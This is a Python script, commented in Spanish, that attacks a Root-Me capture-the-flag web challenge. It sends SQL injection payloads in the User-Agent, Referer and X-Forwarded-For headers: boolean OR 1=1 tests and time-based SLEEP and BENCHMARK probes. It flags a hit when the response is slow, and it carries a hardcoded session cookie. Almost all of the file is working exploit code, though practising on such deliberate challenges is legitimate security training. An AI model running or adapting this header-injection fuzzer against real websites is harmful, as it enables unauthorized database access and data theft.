import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_header_injection(header_name, header_value):
    """Prueba inyección en cabeceras HTTP"""
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": "http://challenge01.root-me.org/",
        "X-Forwarded-For": "127.0.0.1"
    }
    headers[header_name] = header_value
    
    inicio = time.time()
    try:
        r = requests.get(f"{URL}?action=member&member=1", 
                        cookies=COOKIE, 
                        headers=headers, 
                        timeout=30)
        tiempo = time.time() - inicio
        return tiempo, len(r.text)
    except Exception as e:
        print(f"Error: {e}")
        return 0, 0

print("="*70)
print("  PROBANDO INYECCIÓN EN CABECERAS")
print("="*70)

# Probar User-Agent
print("\n[User-Agent]")
ua_payloads = [
    "Mozilla/5.0' OR '1'='1",
    "Mozilla/5.0' OR 1=1-- -",
    "Mozilla/5.0' OR SLEEP(5)-- -",
    "Mozilla/5.0' AND SLEEP(5)-- -",
    "Mozilla/5.0' OR IF(1=1, SLEEP(5), 0)-- -",
    "Mozilla/5.0' OR BENCHMARK(10000000, MD5('x'))-- -",
]

for payload in ua_payloads:
    t, l = test_header_injection("User-Agent", payload)
    status = "✅" if t > 2 else "❌"
    print(f"{status} {payload[:50]:50} -> {t:.2f}s, Length: {l}")
    time.sleep(0.3)

# Probar Referer
print("\n[Referer]")
ref_payloads = [
    "http://attacker.com' OR '1'='1",
    "http://attacker.com' OR 1=1-- -",
    "http://attacker.com' OR SLEEP(5)-- -",
    "http://attacker.com' OR IF(1=1, SLEEP(5), 0)-- -",
]

for payload in ref_payloads:
    t, l = test_header_injection("Referer", payload)
    status = "✅" if t > 2 else "❌"
    print(f"{status} {payload[:50]:50} -> {t:.2f}s, Length: {l}")
    time.sleep(0.3)

# Probar X-Forwarded-For
print("\n[X-Forwarded-For]")
x_forward_payloads = [
    "127.0.0.1' OR '1'='1",
    "127.0.0.1' OR 1=1-- -",
    "127.0.0.1' OR SLEEP(5)-- -",
    "127.0.0.1' OR IF(1=1, SLEEP(5), 0)-- -",
]

for payload in x_forward_payloads:
    t, l = test_header_injection("X-Forwarded-For", payload)
    status = "✅" if t > 2 else "❌"
    print(f"{status} {payload[:50]:50} -> {t:.2f}s, Length: {l}")
    time.sleep(0.3)
